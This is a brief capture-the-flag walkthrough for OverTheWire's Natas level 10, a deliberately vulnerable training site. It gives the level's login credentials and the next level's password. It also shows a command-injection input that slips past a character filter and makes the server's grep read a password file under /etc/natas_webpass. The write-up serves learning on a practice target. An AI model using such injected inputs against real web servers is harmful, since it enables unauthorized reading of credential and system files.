## Natas Level 10 → Level 11
- Go to url: http://natas10.natas.labs.overthewire.org
    - User: Natas10
    - Password: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
- Oh no they added a filter to the previous level!
    - preg_match('/[;|&]/',$key)
    - All the filter does is check if any of the following characters are inside so… we could just use a different command
- input “.* /etc/natas_webpass/natas11 #”, making the command “grep -i .* /etc/natas_webpass/natas11 # dictionary.txt”
    - U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
